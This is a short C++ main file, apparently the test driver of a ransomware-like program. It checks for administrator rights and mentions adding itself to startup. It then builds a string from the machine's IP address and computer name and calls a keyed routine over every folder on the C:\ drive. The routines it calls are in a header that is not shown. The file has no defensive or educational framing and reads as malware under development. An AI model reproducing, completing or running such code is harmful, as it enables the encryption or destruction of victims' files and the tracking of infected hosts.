#include "gg.h"

int main(int argc, char* argv[])
{
    // Initialize COM
    HRESULT hr = CoInitialize(NULL);
    if (FAILED(hr))
    {
        std::cerr << "Failed to initialize COM library." << std::endl;
        return 1;
    }

    // Check for administrative privileges
    bool isAdmin = IsAdministrator(hr);

    if (SUCCEEDED(hr))
    {
        if (isAdmin)
        {
            std::cout << "The program is running with administrative privileges." << std::endl;
        }
        else
        {
            std::cout << "The program is NOT running with administrative privileges." << std::endl;
        }
    }
    else
    {
        std::cerr << "Failed to determine administrative privileges. Error code: " << hr << std::endl;
        CoUninitialize();
        return 1;
    }

    std::cin.get(); // Wait for user input to continue

    // Prompt the user for the path to add to startup
    std::string path = get_this_file_path();
	if (path.empty())
    {
		std::cerr << "Failed to get the path to the program." << std::endl;
		return 1;
	}

	std::cout << "File path: " << path << std::endl;
	std::cout << "Press any key to continue..." << std::endl;

    int key = get_encryption_key();
	std::cout << conccet_ip_and_computer_name(key) << std::endl;
	std::cin.get(); // Wait for user input to continue

    //bool a = get_file_folders(key, "C:\\Users\\benda\\Documents\\staff", "", 1);

    bool a = get_file_folders(63, "C:\\", "", -1);

	std::getchar(); // Wait for user input to continue

    return 0; // Exit with success
}



